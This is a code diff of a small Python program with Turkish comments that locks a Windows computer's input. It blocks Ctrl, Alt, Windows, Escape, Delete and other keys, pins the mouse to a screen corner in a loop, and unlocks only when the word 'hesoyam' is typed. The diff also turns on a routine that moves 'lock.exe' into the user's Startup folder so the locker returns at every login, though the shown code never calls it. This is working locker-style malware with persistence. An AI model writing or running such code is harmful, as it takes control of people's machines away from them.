@@ -3,8 +3,8 @@ import mouse
 import shutil
 import os
 
-"""BizimDosyaAdiExeUzantili = "lock.exe"
-
+BizimDosyaAdiExeUzantili = "lock.exe"
+fareyiKilitle = True
 
 def find(name, path):
     for root, dirs, files in os.walk(path):
@@ -13,35 +13,37 @@ def find(name, path):
 
 
 #Başlangıçta çalıştırma muhabbeti
-hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
-oradaMi = hedefKonum + "/" + BizimDosyaAdiExeUzantili
+def BaslangicaTasi():
+    hedefKonum = os.path.expanduser('~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup')
+    oradaMi = hedefKonum + "/" + BizimDosyaAdiExeUzantili
 
-aramaSonucu = find(BizimDosyaAdiExeUzantili, "C:")
+    aramaSonucu = find(BizimDosyaAdiExeUzantili, "C:")
 
-if(aramaSonucu != None):
-    if not os.path.isfile(oradaMi):
-        shutil.move(os.path.join(aramaSonucu), hedefKonum)
-else:
-    aramaSonucu = find(BizimDosyaAdiExeUzantili, "D:")
-    if not os.path.isfile(oradaMi):
-        shutil.move(os.path.join(aramaSonucu), hedefKonum)
-"""
+    if(aramaSonucu != None):
+        if not os.path.isfile(oradaMi):
+            shutil.move(os.path.join(aramaSonucu), hedefKonum)
+    else:
+        aramaSonucu = find(BizimDosyaAdiExeUzantili, "D:")
+        if not os.path.isfile(oradaMi):
+            shutil.move(os.path.join(aramaSonucu), hedefKonum)
+
 
 
 #klavye kilitleme
-calisiyor = True
-a = {'alt', 'alt gr', 'ctrl', 'left alt', 'left ctrl', 'left shift', 'left windows', 'right alt', 'right ctrl', 'right shift', 'right windows', 'shift', 'windows'}
-for x in a:
-    keyboard.block_key(x)
+def KlavyeyiKilitle():
+    engellenecekTuslar = {'alt','escape','delete','backspace', 'alt gr', 'ctrl', 'left alt', 'left ctrl', 'left shift', 'left windows', 'right alt', 'right ctrl', 'right shift', 'right windows', 'shift', 'windows'}
+    for herBirTus in engellenecekTuslar:
+        keyboard.block_key(herBirTus)
+KlavyeyiKilitle()
 
 def kapat():
     keyboard.unhook_all()
-    global calisiyor
-    calisiyor = False
+    global fareyiKilitle
+    fareyiKilitle = False
 
 #programı kapatmak için şifre hesoyam yazıp space ya da enter basılması
 keyboard.add_word_listener('hesoyam', kapat, triggers=['space', 'enter'], match_suffix=True, timeout=3)
 
 #programın kapanma şartı ve mouse kilitleme
-while (calisiyor):
+while (fareyiKilitle):
     mouse.move(0,0, absolute=True, duration=0)
